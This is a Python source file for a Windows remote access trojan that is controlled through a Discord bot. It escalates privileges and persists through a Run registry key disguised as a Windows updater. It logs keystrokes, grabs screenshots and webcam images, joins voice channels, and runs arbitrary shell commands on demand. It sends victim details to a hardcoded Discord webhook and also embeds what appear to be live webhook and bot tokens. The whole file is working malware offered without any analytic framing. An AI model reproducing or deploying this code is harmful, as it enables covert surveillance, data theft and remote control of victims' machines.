import os
import sys
import time
import socket
import subprocess
import shutil
import psutil
import pyautogui
import cv2
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import requests
import discord
from discord.ext import commands
import winreg
import ctypes
import asyncio
import traceback

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1547865489932292096/e4x_RpnOlw8ggR4WYk2JI-Z9yX8e6ytocCI_3LpsfkOW59cVWxTpkzzFJh14D1Os_2JU"
BOT_TOKEN = "MTU0Nzg1ODA5NTk0MDU3NTI5Mg.GnKeHU.jai3ZRwEzqATAbrKQS0fO5wH0ghlS9BM3sizw8"
PREFIX = "!"

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.guilds = True
intents.voice_states = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

USERNAME = os.getlogin()
HOSTNAME = socket.gethostname()

def wait_for_internet():
    while True:
        try:
            requests.get('https://8.8.8.8', timeout=3)
            return True
        except:
            time.sleep(10)

wait_for_internet()

try:
    IP = requests.get('https://api.ipify.org', timeout=5).text
except:
    IP = "OFFLINE"

APPDATA_DIR = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'WindowsUpdater')
if not os.path.exists(APPDATA_DIR):
    try:
        os.makedirs(APPDATA_DIR)
    except:
        pass

LOG_FILE_PATH = os.path.join(APPDATA_DIR, 'system_logs.txt')

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate_privileges():
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
        except:
            pass

def ensure_persistence():
    try:
        if getattr(sys, 'frozen', False):
            current_exe = sys.executable
        else:
            current_exe = os.path.abspath(__file__)
        
        target_name = os.path.basename(current_exe)
        target_path = os.path.join(APPDATA_DIR, target_name)
        
        if os.path.abspath(current_exe) != os.path.abspath(target_path):
            try:
                shutil.copy2(current_exe, target_path)
            except:
                pass
            
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, target_path)
        winreg.CloseKey(key)
    except:
        pass

def send_to_webhook(content, file_path=None):
    try:
        data = {"content": content}
        files = {}
        if file_path and os.path.exists(file_path):
            files["file"] = open(file_path, "rb")
        requests.post(DISCORD_WEBHOOK_URL, data=data, files=files)
        if file_path and os.path.exists(file_path):
            os.remove(file_path)
    except:
        pass

class Keylogger:
    def __init__(self):
        self.listener = Listener(on_press=self.on_press)
        self.listener.start()

    def on_press(self, key):
        try:
            if isinstance(key, Key):
                if key == Key.space:
                    char_to_write = " "
                elif key == Key.enter:
                    char_to_write = "\n"
                elif key == Key.backspace:
                    char_to_write = " [BACKSPACE] "
                else:
                    return
            else:
                char_to_write = getattr(key, 'char', None)
                if not char_to_write:
                    return

            with open(LOG_FILE_PATH, "a", encoding="utf-8") as f:
                f.write(char_to_write)
        except:
            pass

    def get_log_file(self):
        if os.path.exists(LOG_FILE_PATH):
            return LOG_FILE_PATH
        return None

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        sf = "screenshot.png"
        screenshot.save(sf)
        return sf
    except:
        return None

def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            wf = "webcam.jpg"
            cv2.imwrite(wf, frame)
            cap.release()
            return wf
        cap.release()
        return None
    except:
        return None

def get_pcspecs():
    try:
        cpu = psutil.cpu_percent(interval=1)
        ram = psutil.virtual_memory().percent
        disk = psutil.disk_usage('/').percent
        return f"CPU: {cpu}% | RAM: {ram}% | DISK: {disk}%"
    except:
        return "Error fetching specs"

elevate_privileges()
ensure_persistence()
keylogger = Keylogger()

send_to_webhook(
    f"🚨 **Victim Online!** 🚨\n"
    f"👤 **Username:** `{USERNAME}`\n"
    f"💻 **Hostname:** `{HOSTNAME}`\n"
    f"🌐 **IP:** `{IP}`\n"
    f"Commands: `!keyboard {USERNAME}`, `!screenshot {USERNAME}`, `!pcspec {USERNAME}`, `!cam {USERNAME}`, `!mic {USERNAME}`, `!leave {USERNAME}`, `!shell {USERNAME} <cmd>`, `!shutdown {USERNAME}`, `!restart {USERNAME}`"
)

@bot.event
async def on_ready():
    print(f"Bot connected as {bot.user}")

@bot.command()
async def keyboard(ctx, identifier=None):
    if identifier in [USERNAME, HOSTNAME, IP]:
        log_file = keylogger.get_log_file()
        if log_file:
            await ctx.send(file=discord.File(log_file))
        else:
            await ctx.send(f"❌ No logs found yet.")

@bot.command()
async def screenshot(ctx, identifier=None):
    if identifier in [USERNAME, HOSTNAME, IP]:
        sf = take_screenshot()
        if sf:
            await ctx.send(file=discord.File(sf))
            os.remove(sf)

@bot.command()
async def pcspec(ctx, identifier=None):
    if identifier in [USERNAME, HOSTNAME, IP]:
        specs = get_pcspecs()
        await ctx.send(f"💻 **Specs:**\n{specs}")

@bot.command()
async def cam(ctx, identifier=None):
    if identifier in [USERNAME, HOSTNAME, IP]:
        wf = capture_webcam()
        if wf:
            await ctx.send(file=discord.File(wf))
            os.remove(wf)

@bot.command()
async def mic(ctx, identifier=None):
    if identifier in [USERNAME, HOSTNAME, IP]:
        if ctx.author.voice:
            channel = ctx.author.voice.channel
            try:
                if ctx.voice_client:
                    await ctx.voice_client.move_to(channel)
                else:
                    await channel.connect()
                await ctx.send(f"🎙️ **Connected to voice channel:** `{channel.name}`")
            except Exception as e:
                err_msg = traceback.format_exc()
                if len(err_msg) > 1900:
                    err_msg = err_msg[:1900]
                await ctx.send(f"❌ Voice error details:\n```{err_msg}```")
        else:
            await ctx.send("❌ You must join a voice channel first!")

@bot.command()
async def leave(ctx, identifier=None):
    if identifier in [USERNAME, HOSTNAME, IP]:
        if ctx.voice_client:
            await ctx.voice_client.disconnect()
            await ctx.send("Disconnected from voice channel.")
        else:
            await ctx.send("Not connected to any voice channel.")

@bot.command()
async def shell(ctx, identifier=None, *, command=None):
    if identifier in [USERNAME, HOSTNAME, IP] and command:
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            if len(output) > 1900:
                output = output[:1900] + "\n[Output truncated...]"
            await ctx.send(f"💻 **Shell Output:**\n```{output}```")
        except Exception as e:
            await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
async def shutdown(ctx, identifier=None):
    if identifier in [USERNAME, HOSTNAME, IP]:
        await ctx.send(f"⚠️ Shutting down system...")
        os.system("shutdown /s /t 1")

@bot.command()
async def restart(ctx, identifier=None):
    if identifier in [USERNAME, HOSTNAME, IP]:
        await ctx.send(f"⚠️ Restarting system...")
        os.system("shutdown /r /t 1")

bot.run(BOT_TOKEN)